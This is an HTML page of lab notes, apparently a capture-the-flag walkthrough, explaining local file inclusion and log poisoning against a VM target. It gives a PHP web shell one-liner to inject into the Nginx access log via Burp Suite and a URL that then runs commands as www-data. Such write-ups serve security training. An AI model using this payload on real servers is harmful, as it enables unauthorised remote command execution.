<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>3.4 Exploit LFI</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>3.4 Exploit LFI</u></b></h1><br /><br /><br /><strong>Local file inclusion</strong> (<strong>LFI</strong>)<br /><br />A file inclusion vulnerability is a type of <a href="https://en.wikipedia.org/wiki/World_Wide_Web">web</a> <a href="https://en.wikipedia.org/wiki/Vulnerability_(computing)">vulnerability</a> that is most commonly found to affect <a href="https://en.wikipedia.org/wiki/Web_application">web applications</a> that rely on a scripting <a href="https://en.wikipedia.org/wiki/Run_time_(program_lifecycle_phase)">run time</a>. More info at <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">Wikipedia</a>.<br /><br />a) Let’s capture the request of the “Nginx Access log” file using Burpsuite.  we will use LFI to exploit Nginx access log.<br /><br />• Open Burp Suite.<br />• Go to “Proxy-&gt;Intercept”.<br />• Make  sure the button “Intercept is on”.<br />• Navigate to <a href="http://192.168.12.59/thankyou.php?file=/var/log/nginx/access.log">http://192.168.12.59/thankyou.php?file=/var/log/nginx/access.log</a>.<br /><br />NOTICE<br />Before going to the link change the “Preferences” in your Browser.<br />Select the Manual proxy configuration radio button. Enter 127.0.0.1 in the HTTP Proxy field and enter 8080 in the Port field. Make sure the Use this proxy server for all protocols box is checked. Delete anything that’s in the No proxy for field. Save the settings.<br /><br /><img src="images/248-1.png" alt="images/248-1.png" /><br /><br /><br /><br />b) Inject on Burp Suite the following code  to get the command line access by making a GET request to the Server.<br /><br />&lt;?php system($_GET['cmd']) ?&gt;<br /><br /><br /><br />You'll see the following in Burp Suite.<br /><br /><img src="images/248-2.png" alt="images/248-2.png" /><br /><br />c) Click the button “Intercept is on” to switch it “off”.<br /><br />d) Verify wheteher it's working or no.<br /><br />Add a parameter to the URL i.e “&amp;cmd=id”. So, the URL is <a href="http://192.168.12.59/thankyou.php?file=/var/log/nginx/access.log&cmd=id.">http://192.168.12.59/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=id</a><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/248-3.png" alt="images/248-3.png" /><br /><br />We can get “id” and other data.<br /><br />“uid=33(www-data) gid=33(www-data) groups=33(www-data)"<br /><br />NOTICE:<br />If you get to this point and you can’t see the logs, try to reinstall the Machine on Virtual Machine and go to the page again..<br /><br /><br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>